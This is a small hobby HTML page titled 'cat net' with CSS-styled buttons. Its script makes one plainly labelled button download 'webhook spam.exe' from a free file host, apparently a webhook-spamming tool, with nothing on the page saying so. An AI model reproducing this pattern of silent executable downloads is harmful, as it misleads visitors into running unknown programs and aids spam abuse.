<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            background-color: #000000; /* Black background for the entire page */
            color: white; /* White text */
            display: flex;
            justify-content: flex-start; /* Align items to the left */
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 0;
            flex-direction: row; /* Arrange containers horizontally */
        }

        .page-title {
            position: absolute;
            top: 10px;
            left: 10px;
            font-size: 36px; /* Even larger font size */
        }

        .container {
            background-color: #333333; /* Dark grey background */
            color: white; /* White text */
            width: 200px;
            height: 100px;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            border-radius: 12px;
            border: 2px solid white; /* White border */
            margin: 10px; /* Add some space between containers */
        }

        .cool-button {
            background-color: #0000FF; /* Blue */
            border: none;
            color: white;
            padding: 10px 20px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            margin: 4px 2px;
            cursor: pointer;
            border-radius: 12px;
            transition-duration: 0.4s;
            box-shadow: 0 0 10px #0000FF; /* Blue glow */
        }

        .cool-button:hover {
            background-color: #000080; /* Darker blue */
            box-shadow: 0 0 20px #0000FF, 0 0 10px #FFFFFF; /* Intensify blue glow and add white glow to border */
        }

        .title {
            margin-bottom: 10px;
        }

        .image-button {
            background-image: url('TwitterIconURL'); /* Replace with your Twitter icon URL */
            background-size: cover;
            width: 50px;
            height: 50px;
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body>

<div class="page-title">cat net</div>

<div class="container">
    <div class="title">ボタン1</div>
    <button class="cool-button" id="button1">ポタン</button>
</div>

<div class="container">
    <button class="image-button" id="imageButton"></button>
</div>

<div class="container">
    <div class="title">ボタン2</div>
    <button class="cool-button">ポタン</button>
</div>

<script>
    document.getElementById("button1").onclick = function () {
        window.location.href = "http://torriot.starfree.jp/fileuploader/file/file-mbz/webhook%20spam.exe";
    };

    document.getElementById("imageButton").onclick = function () {
        window.location.href = "https://x.com/youmao689578878";
    };
</script>

</body>
</html>
